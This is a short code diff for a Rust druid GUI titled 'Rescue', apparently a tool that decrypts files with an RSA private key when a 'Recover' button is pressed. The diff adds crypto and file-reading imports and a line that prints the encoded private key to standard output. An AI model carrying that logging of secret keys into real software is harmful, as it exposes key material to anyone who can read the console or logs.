@@ -1,3 +1,5 @@
+use std::fs::File;
+use std::io::Read;
 use druid::piet::InterpolationMode;
 use druid::widget::{Button, FillStrat, Image, SizedBox};
 use druid::{
@@ -5,6 +7,9 @@ use druid::{
     AppLauncher, Data, ImageBuf, Lens, LocalizedString, Widget, WidgetExt, WindowDesc,
 };
 use std::sync::Arc;
+use base64::decode;
+use openssl::rsa::Rsa;
+use nakitai::utils::crypto;
 
 const WINDOW_TITLE: LocalizedString<AppState> = LocalizedString::new("Rescue ( •̀ᴗ•́)و ̑̑");
 
@@ -39,6 +44,8 @@ fn build_root_ui() -> impl Widget<AppState> {
         Button::new("Recover")
             .on_click(|_ctx, data: &mut AppState, _env| {
                 data.is_decrypting = true.into();
+
+                println!("private_key_encoded_str => {:?}", data.private_key_encoded_str);
             })
             .disabled_if(|data: &AppState, _env| *data.is_decrypting),
     )
